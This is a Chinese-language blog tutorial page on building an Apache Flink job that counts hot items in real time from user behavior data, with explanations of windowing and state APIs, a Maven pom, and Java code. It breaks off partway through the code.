src="https://img-blog.csdnimg.cn/20200602183121950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=pgyjx&originHeight=366&originWidth=711&originalType=binary&ratio=1&status=done&style=none"></p><h5 id="数据源"><a href="#数据源" class="headerlink" title="数据源"></a>数据源</h5><p><img src="https://img-blog.csdnimg.cn/20200602183227549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=T8iAx&originHeight=367&originWidth=674&originalType=binary&ratio=1&status=done&style=none"></p><h5 id="数据源-数据结构"><a href="#数据源-数据结构" class="headerlink" title="数据源-数据结构"></a>数据源-数据结构</h5><p><strong>UserBehavior</strong></p><p><img src="https://img-blog.csdnimg.cn/20200602183249723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=Xnnir&originHeight=328&originWidth=798&originalType=binary&ratio=1&status=done&style=none"></p><p><strong>ApacheLogEvent</strong></p><p><img src="https://img-blog.csdnimg.cn/20200602183323920.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=TtUcy&originHeight=328&originWidth=798&originalType=binary&ratio=1&status=done&style=none"></p><h4 id="项目模块"><a href="#项目模块" class="headerlink" title="项目模块"></a>项目模块</h4><p><img src="https://img-blog.csdnimg.cn/20200602183434342.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=RdeSD&originHeight=340&originWidth=708&originalType=binary&ratio=1&status=done&style=none"></p><h5 id="热门实时商品统计"><a href="#热门实时商品统计" class="headerlink" title="热门实时商品统计"></a>热门实时商品统计</h5><p><img src="https://img-blog.csdnimg.cn/20200602183513841.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=zuXSW&originHeight=355&originWidth=687&originalType=binary&ratio=1&status=done&style=none"></p><p><img src="https://img-blog.csdnimg.cn/20200602183537531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=e6cw8&originHeight=435&originWidth=686&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>按照商品id进行分区</li></ul><p><img src="https://img-blog.csdnimg.cn/20200602183613384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=dvpPp&originHeight=328&originWidth=714&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>设置窗口时间</li></ul><p><img src="https://img-blog.csdnimg.cn/20200602183637249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=D8o4C&originHeight=305&originWidth=698&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>时间窗口（timeWindow）区间为左闭右开</li><li>同一份数据会被分发到不同的窗口</li></ul><p><img src="https://img-blog.csdnimg.cn/20200602183733756.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=wyFk7&originHeight=258&originWidth=704&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>窗口聚合</li></ul><p><img src="https://img-blog.csdnimg.cn/20200602183749122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=OymWe&originHeight=287&originWidth=700&originalType=binary&ratio=1&status=done&style=none"></p><ul><li><p> 窗口聚合策略——没出现一条记录就加一 </p></li><li><p> 实现AggregateFunction接口<br><code>interface AggregateFunction&lt;IN, ACC, OUT&gt;</code> </p></li><li><p> 定义输出结构——<code>ItemViewCount(itemId,windowEnd,count)</code> </p></li><li><p>实现WindowFunction接口 </p><ul><li><code>interface WindowFunction&lt;IN,OUT,KEY,W extends Window&gt;</code> <ul><li>IN：输入为累加器的类型，Long</li><li>OUT：窗口累加以后输出的类型为<code>ItemViewCount(itemId: Long,windowEnd: Long,count: Long)</code>，windowEnd为窗口的结束时间，也是窗口的唯一标识</li><li>KEY：Tuple泛型，在这里是itemId，窗口根据itemId聚合</li><li>W：聚合的窗口，<code>w.getEnd</code>就能拿到窗口的结束时间<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">apply</span><span class="params">(Tuple tuple, TimeWindow window,</span></span></span><br><span class="line"><span class="params"><span class="function">                 Iterable&lt;Long&gt; input, Collector&lt;ItemViewCount&gt; out)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">  Long itemId = tuple.getField(<span class="number">0</span>);</span><br><span class="line">  Long windowEnd - window.getEnd();</span><br><span class="line">  Long count = input.iterator().next();</span><br><span class="line">  out.collect(<span class="keyword">new</span> ItemViewCount(itemId, windowEnd, count));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p> 窗口聚合示例 </p></li></ul><p><img src="https://img-blog.csdnimg.cn/20200602183856808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=W3q78&originHeight=333&originWidth=723&originalType=binary&ratio=1&status=done&style=none"></p><ul><li><strong>进行统计整理 —— keyBy(“windowEnd”)</strong></li></ul><p><img src="https://img-blog.csdnimg.cn/2020060218391775.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=ZlEgZ&originHeight=255&originWidth=664&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>状态编程</li></ul><p><img src="https://img-blog.csdnimg.cn/20200602183935754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=e5gDI&originHeight=313&originWidth=724&originalType=binary&ratio=1&status=done&style=none"></p><ul><li><strong>最终排序输出——keyedProcessFunction</strong> <ul><li>针对有状态流的底层API</li><li>KeyedProcessFunction会对分区后的每一条子流进行处理</li><li>以windowEnd作为key，保证分流以后每一条流的数据都在一个时间窗口内</li><li>从ListState中读取当前流的状态，存储数据进行排序输出</li></ul></li></ul><hr><ul><li>用ProcessFunction定义KeyedStream的处理逻辑</li><li>分区之后，每个KeyedStream都有其自己的生命周期 <ul><li>open：初始化，在这里可以获取当前流的状态</li><li>processElement：处理流中每一个元素时调用</li><li>onTimer：定时调用，注册定时器Timer并触发之后的回调操作</li></ul></li></ul><p><img src="https://img-blog.csdnimg.cn/20200602184003237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=AkjyX&originHeight=304&originWidth=652&originalType=binary&ratio=1&status=done&style=none"></p><h6 id="POJO"><a href="#POJO" class="headerlink" title="POJO"></a>POJO</h6><p>需要生成get/set、无参/有参构造函数、toString</p><ul><li><p> ItemViewCount  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Long itemId;</span><br><span class="line"><span class="keyword">private</span> Long windowEnd;</span><br><span class="line"><span class="keyword">private</span> Long count;</span><br></pre></td></tr></table></figure></li><li><p> UserBehavior  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Long uerId;</span><br><span class="line"><span class="keyword">private</span> Long itemId;</span><br><span class="line"><span class="keyword">private</span> Integer categoryId;</span><br><span class="line"><span class="keyword">private</span> String behavior;</span><br><span class="line"><span class="keyword">private</span> Long timestamp;</span><br></pre></td></tr></table></figure></li></ul><h6 id="代码1-文件"><a href="#代码1-文件" class="headerlink" title="代码1-文件"></a>代码1-文件</h6><ul><li><p> 父pom依赖  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>UserBehaviorAnalysis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modules</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">module</span>&gt;</span>HotItemsAnalysis<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">modules</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">flink.version</span>&gt;</span>1.12.1<span class="tag">&lt;/<span class="name">flink.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scala.binary.version</span>&gt;</span>2.12<span class="tag">&lt;/<span class="name">scala.binary.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">kafka.version</span>&gt;</span>2.7.0<span class="tag">&lt;/<span class="name">kafka.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mysql.version</span>&gt;</span>8.0.19<span class="tag">&lt;/<span class="name">mysql.version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- flink --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-streaming-java_$&#123;scala.binary.version&#125;<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-clients_$&#123;scala.binary.version&#125;<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- kafka --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.kafka<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>kafka_$&#123;scala.binary.version&#125;<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;kafka.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-connector-kafka_$&#123;scala.binary.version&#125;<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">encoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">encoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p> java代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.ItemViewCount;</span><br><span class="line"><span class="keyword">import</span> beans.UserBehavior;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.compress.utils.Lists;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.AggregateFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ListState;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ListStateDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.KeyedProcessFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.windowing.WindowFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.SlidingEventTimeWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.SlidingProcessingTimeWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.windows.TimeWindow;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Timestamp;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/4 6:07 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HotItems</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 创建执行环境</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    <span class="comment">// 设置并行度为1</span></span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 从csv文件中获取数据</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.readTextFile(<span class="string">&quot;/tmp/UserBehaviorAnalysis/HotItemsAnalysis/src/main/resources/UserBehavior.csv&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 转换成POJO,分配时间戳和watermark</span></span><br><span class="line">    DataStream&lt;UserBehavior&gt; userBehaviorDataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> UserBehavior(<span class="keyword">new</span> Long(fields[<span class="number">0</span>]), <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Integer(fields[<span class="number">2</span>]), fields[<span class="number">3</span>], <span class="keyword">new</span> Long(fields[<span class="number">4</span>]));</span><br><span class="line">    &#125;).assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">      <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;UserBehavior&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(UserBehavior element)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 分组开窗聚合，得到每个窗口内各个商品的count值</span></span><br><span class="line">    <span class="comment">//        DataStream&lt;ItemViewCount&gt; windowAggStream = userBehaviorDataStream</span></span><br><span class="line">    DataStream&lt;ItemViewCount&gt; windowAggStream = userBehaviorDataStream</span><br><span class="line">      <span class="comment">// 过滤只保留pv行为</span></span><br><span class="line">      .filter(userBehavior -&gt; <span class="string">&quot;pv&quot;</span>.equals(userBehavior.getBehavior()))</span><br><span class="line">      <span class="comment">// 按照商品ID分组</span></span><br><span class="line">      .keyBy(UserBehavior::getItemId)</span><br><span class="line">      <span class="comment">// 滑动窗口</span></span><br><span class="line">      .window(SlidingEventTimeWindows.of(Time.hours(<span class="number">1</span>), Time.minutes(<span class="number">5</span>)))</span><br><span class="line">      .aggregate(<span class="keyword">new</span> ItemCountAgg(), <span class="keyword">new</span> WindowItemCountResult());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 收集同一窗口的所有商品的count数据，排序输出top n</span></span><br><span class="line">    DataStream&lt;String&gt; resultStream = windowAggStream</span><br><span class="line">      <span class="comment">// 按照窗口分组</span></span><br><span class="line">      .keyBy(ItemViewCount::getWindowEnd)</span><br><span class="line">      <span class="comment">// 用自定义处理函数排序取前5</span></span><br><span class="line">      .process(<span class="keyword">new</span> TopNHotItems(<span class="number">5</span>));</span><br><span class="line"></span><br><span class="line">    resultStream.print();</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;hot items analysis&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现自定义增量聚合函数</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ItemCountAgg</span> <span class="keyword">implements</span> <span class="title">AggregateFunction</span>&lt;<span class="title">UserBehavior</span>, <span class="title">Long</span>, <span class="title">Long</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">createAccumulator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span 